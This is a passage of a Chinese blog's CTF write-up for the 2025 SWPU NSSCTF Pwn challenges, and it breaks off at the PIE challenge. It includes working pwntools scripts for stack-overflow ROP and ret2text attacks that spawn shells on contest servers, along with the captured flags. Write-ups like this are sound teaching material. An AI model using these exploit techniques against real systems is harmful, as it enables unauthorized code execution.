+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776586845972-a900b358-5d1c-4354-ad34-a84a27d168ec.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403418061-4a61dbd4-1131-4457-a456-273e780fb7fc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776600882195-420d59ea-b6ec-498f-90d3-f9f41a944190.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776600999603-6536b042-756c-4f8a-b009-485c8d38bcd8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601016325-4d08df73-b7c2-4fd7-beab-ebd2bc5a8bf2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601084969-3e21953c-bf43-4fda-8821-62773c5b7fa6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601606741-b0095545-97e7-409d-a441-e7df5c47c259.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776602348021-e0e2807a-95db-4f4b-901b-cafd3c061f30.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776602482291-0d3591e3-61c2-4601-9ef1-90f3cb7dd218.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604239994-fcc8164e-ae5d-4b5a-9096-e1e91912db47.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403432317-6771035f-47f1-474c-9c27-7226f15f8c26.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604622897-92318f5d-4f29-4795-ac48-606ed5834004.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604684167-42f27185-24ad-4ee2-b718-b3d2ccc2d5df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604731570-21a1e5f0-3298-442f-98a4-9d28c463228c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604776115-5d52af96-0098-413e-8e1b-7b3b55c92c96.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604843100-3432003b-2bb6-4084-85a7-07488dbacdce.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604920782-4e4b5cd7-908f-401c-b6c9-ab63a65641af.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776606048722-28a605ba-3f1c-495a-9d16-1b89e08b285a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776606759973-9373cd2d-44ed-4ca4-9922-5d42d4133694.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403441516-ee933e0b-8342-43a2-a9bd-3ba8fcdeaaa0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643734322-895d7679-70eb-47b7-8442-824ad5919522.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643758913-07e9fe99-aec2-427d-9243-6254adca5ac6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643942265-9bb188f6-e686-4d57-98f8-cd6d44b8059f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776644288415-6155d900-4ea2-4837-9a70-3236a3299bfd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776645955785-841432c9-d9d9-470b-819e-57649a5a64ed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776647828351-d428f94e-9b1a-4d29-9206-fd71ffdcb880.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403463658-e5d47aff-a273-46c5-85fd-6a3e269b4371.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776647923196-fb450290-3a80-4597-a233-0a3436ca2f37.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648010750-ef744841-9367-417b-9819-0c0bfc9f0dcc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648019851-ea25acc2-1751-406c-909e-35513caafa7f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776648119345-7a0e8982-a252-4df3-979d-ad6b3faee6fc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776653304130-cf9fcb06-d279-4e11-ad89-4608c7475bf0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776653294746-ce2273ad-ec12-4fad-a79f-c71c9651b60e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776656108995-ab93a332-b8c0-4808-840b-83baa805968e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776753619078-c813a393-883d-435f-bfc0-c6cab294359f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776752141737-34d65846-bbce-434d-be9b-a59c47c5b4d9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403472454-4c5914d5-6c79-4af1-8f93-a7c134030513.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776756736042-0b6749a2-7a76-4f1a-9268-07d22418a372.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776756770120-70900ff8-a1d3-4b15-91ba-3e23c3730bb7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776768370502-a84fd72b-3fdb-49f3-8bab-a2bef4e36e05.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776770002296-63ef8384-8265-4ff0-83d5-4ce0d4bec9f5.png">
+<meta property="article:published_time" content="2026-04-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-21T11:52:24.276Z">
+<meta property="article:author" content="Meiyouqian">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="新生赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776392819930-ec625c15-a065-4985-9afc-ed8c9f808612.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2025-SWPU-NSSCTF(Pwn全) - 玫幽倩的小博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/mk.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>玫幽倩</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025-SWPU-NSSCTF(Pwn全)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-21 00:00" pubdate>
+          2026年4月21日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          78 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025-SWPU-NSSCTF(Pwn全)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>前边很大一部分是我很久以前刚刚学的时候写的，想想也要有8、9个月以前了，前边很多题可能解法比较复杂或者写的烂也是因为这个（）</p>
+<p>最近翻出来发现之前不会的一直尬在那里没去补，所以就想着补完发一份了</p>
+<p>当时作为新人打这个比赛其实打的还是很开心的，当时的ai也没那么发达</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776392819930-ec625c15-a065-4985-9afc-ed8c9f808612.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Does-your-nc-work"><a href="#Does-your-nc-work" class="headerlink" title="Does your nc work?"></a>Does your nc work?</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153831500-62ba24bc-962a-4526-9dfb-41d3580d1976.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接虚拟机nc node5.anna.nssctf.cn 25196</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754154096695-f630992d-b941-4e66-a3fd-6158cbd5a49d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边我们先进入根目录，ls列一下，发现有个nss，那我想cat一下，结果不是</p>
+<p>那继续cd进去nss目录，看见ctf想继续cat，结果又不是</p>
+<p>最后打开ctf目录才是，答案为NSSCTF{4e2ebb16-becf-492a-a3cb-208e5d458076}</p>
+<h2 id="gift-pwn"><a href="#gift-pwn" class="headerlink" title="gift_pwn"></a>gift_pwn</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237635020-3431ba7d-308f-4ab2-8007-997b1d0895fb.png" srcset="/img/loading.gif" lazyload></p>
+<p>nc node4.anna.nssctf.cn 28348</p>
+<p>输入虚拟机然后就没动静了，那没办法只能开ida看看了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237682291-0ba86c63-1838-47e9-ab9b-452de36f614f.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边<font style="color:rgb(77, 77, 77);">vuln</font>存在有栈溢出的漏洞，因为显然buf只能存储16字节的数据，但是read函数允许读取100个字节以内的数据，因此很容易栈溢出。我们可以通过溢出的部分来执行任意代码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237890868-84bd0c2c-652c-4732-8f0d-053fbd97bd6d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到还有&#x2F;bin&#x2F;sh，点开来看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237977924-2acb3d32-abd3-4691-82b1-fbd96b1e6e54.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到&#x2F;bin&#x2F;sh开始于4005B6</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238036358-b959325b-b3f1-488a-8b23-a27f6d0810a7.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以构造这样子的payload即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238120054-237be44c-12bc-433f-91c3-76880d3bbc2d.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238171428-ce97df10-1104-48aa-a9ca-4fc04da286dd.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接ls发现flag然后cat即可</p>
+<p>NSSCTF{2ef7ead1-9abc-4d8e-bce4-87ecfebe3453}</p>
+<h2 id="口算题卡"><a href="#口算题卡" class="headerlink" title="口算题卡"></a>口算题卡</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754117227780-1987c087-f4ff-4806-960b-9fadba3c4cbc.png" srcset="/img/loading.gif" lazyload></p>
+<p>这网站登不上，只能nc了nc node4.anna.nssctf.cn 28790</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754123493681-8bced829-41f1-4246-921d-783f038a92bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>不是这比赛怎么全是litctf（欺负我上次lit没去比是吧）</p>
+<p>做了几道发现没啥用，再做几道试试看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754123776900-053c2bb8-7aae-47aa-8096-3b18e4f7bb3b.png" srcset="/img/loading.gif" lazyload></p>
+<p>怪好玩的，但这样子不知道什么时候是个头，必须写一个代码循环完成计算工作，直到出现答案</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153659740-82944e7b-2e85-498f-a7c8-ad77696b6061.png" srcset="/img/loading.gif" lazyload></p>
+<p>每行自动计算，最后得到如下结果</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153617103-b5e6477e-70af-4ff0-8577-8a6ac8575810.png" srcset="/img/loading.gif" lazyload></p>
+<p>答案如上</p>
+<h2 id="Where-is-shell"><a href="#Where-is-shell" class="headerlink" title="Where_is_shell"></a>Where_is_shell</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757118889462-5eb5200e-99ca-47b2-99c5-84ed06428404.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944973490-bb989c77-5aa5-4d0c-abb5-3bf33b58f536.png" srcset="/img/loading.gif" lazyload></p>
+<p>先die看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119084622-f03cf3e5-38c2-497f-910d-883accc4c4c8.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位Linux，注意payload用p64封装</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119169313-3c465c4d-e278-4245-87b2-97842e4734a1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到这个read函数能写56个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119201534-b5c99fec-11c6-4707-bf9c-58f8caa0ebe8.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是buf搞0x10+8就溢出了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1755765916320-c5c63cb4-dbf9-43f7-a056-cc4518e3f6ca.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们搞这个64位传参</p>
+<p>这边可以看到我们system的参数是不对的，我们需要用pop把bin_sh给谈到rdi里，然后system这个bin_sh<br>这边我们需要这个rdi和ret的地址，我们利用代码</p>
+<p>ROPgadget –binary “shell” –only “pop|ret”</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944719819-d7c675e2-115c-4e85-9337-271eb1a0bd09.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边即可得到</p>
+<p>rdi &#x3D; 0x04005e3</p>
+<p>ret &#x3D; 0x0400416</p>
+<p>接下来传参给system即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944904686-3ca0aad6-e81a-4046-96df-867798e79b17.png" srcset="/img/loading.gif" lazyload></p>
+<p>哦？没有&#x2F;bin&#x2F;sh啊，但是保护开了NX，我们用不了shellcode</p>
+<p>但是搜sh是可以搜到的（也是正好sh可以指向这个&#x2F;bin&#x2F;sh）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945160389-2ec5aae0-f5b5-4fe3-9ffb-c4a04cdc3c5f.png" srcset="/img/loading.gif" lazyload></p>
+<p>next，所以sh的地址不是0x400540，而是0x400541，这应该是唯一的难点了</p>
+<p>后边就传参就是了，注意题目和64位需要ret栈对齐</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level = &quot;debug&quot;<br>io=remote(&quot;node4.anna.nssctf.cn&quot;,28447)<br><br>padding=0x10+8<br>rdi = 0x04005e3<br>ret = 0x0400416<br>system = 0x400430<br>sh = 0x400541<br><br>payload = b&quot;a&quot;*padding +p64(rdi)+p64(sh)+p64(ret)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945399713-141ecc15-bf06-4432-8ae9-055114f7df7e.png" srcset="/img/loading.gif" lazyload></p>
+<p>NSSCTF{649095a2-cd59-4c3d-b7d8-0ee0f1f70378}</p>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945687584-34457e57-fd9c-4204-9be4-88d1f9d296b9.png" srcset="/img/loading.gif" lazyload></p>
+<p>？？没附件？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945795623-56861d08-ef37-4c8d-9871-ef772e0824f9.png" srcset="/img/loading.gif" lazyload></p>
+<p>额，这是。。？这。签到题吧，怎么会比刚那题做的人少啊？这都没难度啊</p>
+<p>NSSCTF{64a18987-9d10-4bf1-81d0-a5d2a6a74d80}</p>
+<h2 id="ret2text-ez"><a href="#ret2text-ez" class="headerlink" title="ret2text_ez"></a>ret2text_ez</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945891593-6f0108b1-6baa-4e5d-8157-6fb362e51872.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945964141-70ee960a-fa95-4ffd-a273-7eceb9e0e655.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945976791-38794361-38f5-4f4c-84a3-7922bfb138b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945997988-88ef99b8-e59b-437e-8b1e-f75b819f1ab1.png" srcset="/img/loading.gif" lazyload></p>
+<p>在vuln函数可以找到漏洞点</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946016287-6dad245a-05c1-40c2-b19c-8f46008c2e23.png" srcset="/img/loading.gif" lazyload></p>
+<p>0x20+8溢出</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946031829-32fe0bca-7aac-4200-8d0b-0bbd55495297.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在后门函数，我们直接构造漏洞后定位到这边即可，简单题</p>
+<p>backdoor地址为0x401196</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level = &quot;debug&quot;<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,29705)<br><br>padding=0x20+8<br>backdoor=0x401196<br><br>payload = b&quot;a&quot;*padding +p64(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946170281-79f7b6cf-2b07-46a5-9bbe-b9603acac39d.png" srcset="/img/loading.gif" lazyload></p>
+<p>NSSCTF{b094eec7-ea92-4af1-b5e0-90b830ff48fe}</p>
+<h2 id="ezpie"><a href="#ezpie" class="headerlink" title="ezpie"></a>ezpie</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946354915-5ca7fba1-86c9-4ac5-b9a8-110387720bdc.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看保护，这边开了PIE</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953864583-85e09cb4-3dd2-450f-a8c5-a8ba08802dd8.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后看die</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953872596-322159e9-2307-4d8a-93de-e7a3a6712233.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边开了PIE</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953994740-79d0eb46-14c2-4a7b-a92e-1ab6abb16ce0.png" srcset="/img/loading.gif" lazyload></p>
+<p>即位置无关可执行文件，这意味着我们不能再直接写地址构造过去</p>
+<!-- 这是一张图片，ocr 内容为： -->
